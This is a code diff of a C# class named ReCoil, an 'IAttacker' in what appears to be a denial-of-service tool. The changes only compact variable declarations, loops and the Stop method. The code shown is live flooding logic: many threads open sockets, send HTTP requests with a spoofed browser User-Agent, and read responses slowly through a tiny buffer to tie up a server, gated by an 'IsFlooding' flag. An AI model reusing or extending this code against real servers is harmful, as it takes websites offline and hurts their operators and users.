@@ -39,15 +39,9 @@ namespace GAS.Core
     /// </remarks>
     public class ReCoil : IAttacker
     {
-        bool init = false;
-        private string _dns;
-        private string _ip;
-        private int _port;
-        private string _subSite;
-        private bool _random;
-        private bool _usegZip;
-        private bool _resp;
-        private int _nSockets;
+        private string _dns, _ip, _subSite;
+        private int _port, _nSockets;
+        private bool _random,_usegZip,_resp,init = false;
         private Thread[] WorkingThreads;
         private string DefaultAgent,
                        RandomAgent = "GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}{4}{2}";
@@ -70,11 +64,7 @@ namespace GAS.Core
             this.WorkingThreads = new Thread[ThreadCount];
             this.States = new ReqState[ThreadCount];
             this._lSockets = new List<Socket>[ThreadCount];
-            for (int i = 0; i < ThreadCount; i++)
-            {
-                States[i] = ReqState.Ready;
-                _lSockets[i]= new List<Socket>();
-            }
+            for (int i = 0; i < ThreadCount; States[i] = ReqState.Ready, _lSockets[i++] = new List<Socket>()) ;
             this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
             this._ip = ip;
             this._port = port;
@@ -93,8 +83,7 @@ namespace GAS.Core
         }
         public override void Start()
         {
-            if (IsFlooding)
-                Stop();
+            if (IsFlooding) Stop();
             IsFlooding = true;
             for (int i = 0; i < ThreadCount; (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i++));
             init = true;
@@ -102,30 +91,18 @@ namespace GAS.Core
         public override void Stop()
         {
             IsFlooding = false;
-            try
-            {
-                foreach (var x in WorkingThreads)
-                {
-                    try
-                    {
-                        x.Abort();
-                    }
-                    catch { }
-                }
-            }
-            catch { }
+            foreach (var x in WorkingThreads)
+              try { x.Abort(); }
+              catch { }
         }
         private void bw_DoWork(object indexinthreads)
         {
-            while (!init)
-                Thread.Sleep(100);
+            while (!init) Thread.Sleep(100);
             int MY_INDEX_FOR_WORK = (int) indexinthreads;
             try
             {
-                int bsize = 16;
-                int mincl = 16384; // set minimal content-length to 16KB
-                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent);
-                byte[] rbuf = new byte[bsize];
+                int bsize = 16,mincl = 16384; // set minimal content-length to 16KB
+                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(DefaultAgent),rbuf = new byte[bsize];
                 States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                 var stop = DateTime.Now;
                 string redirect = "";
@@ -171,8 +148,7 @@ namespace GAS.Core
                                         string header = "";
                                         while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
                                             header += System.Text.Encoding.ASCII.GetString(rbuf);
-                                        string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
-                                        string[] tsp;
+                                        string[] sp = header.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries),tsp;
                                         for (int i = (sp.Length - 1); i >= 0; i--)
                                         {
                                             tsp = sp[i].Split(':');
